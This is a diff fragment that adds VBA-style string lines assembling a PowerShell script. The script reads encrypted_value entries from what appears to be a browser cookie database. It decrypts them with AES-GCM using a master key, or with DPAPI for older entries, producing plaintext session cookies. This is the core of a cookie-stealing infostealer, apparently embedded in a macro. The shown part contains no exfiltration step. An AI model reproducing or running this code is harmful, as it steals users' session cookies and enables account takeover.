@@ -1,0 +1,31 @@
+"while ($reader.Read()) {" & _
+"    $encrypted = $reader.GetValue(6)   # ordinal 6 for encrypted_value" & _
+"" & _
+"    if ($encrypted -is [byte[]]) {" & _
+"        $cookieValue = $null" & _
+"" & _
+"        # Check if modern AES-GCM format" & _
+"        $prefix = [System.Text.Encoding]::ASCII.GetString($encrypted, 0, 3)" & _
+"        if ($prefix -eq 'v10') {" & _
+"            # AES-GCM decryption" & _
+"            $nonce = $encrypted[3..14]" & _
+"            $ciphertext = $encrypted[15..($encrypted.Length-1)]" & _
+"" & _
+"            $aes = [System.Security.Cryptography.AesGcm]::new($masterKey)" & _
+"            $plaintext = New-Object byte[] ($ciphertext.Length - 16)  # last 16 bytes = tag" & _
+"            $tag = $ciphertext[($ciphertext.Length-16)..($ciphertext.Length-1)]" & _
+"            $ciphertextOnly = $ciphertext[0..($ciphertext.Length-17)]" & _
+"" & _
+"            $aes.Decrypt($nonce, $ciphertextOnly, $tag, $plaintext)" & _
+"            $cookieValue = [System.Text.Encoding]::UTF8.GetString($plaintext)" & _
+"        }" & _
+"        else {" & _
+"            # Old DPAPI encryption" & _
+"            $cookieValue = [System.Text.Encoding]::UTF8.GetString(" & _
+"                [System.Security.Cryptography.ProtectedData]::Unprotect(" & _
+"                    $encrypted, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser" & _
+"                )" & _
+"            )" & _
+"        }" & _
+"    }" & _
+"}" & _
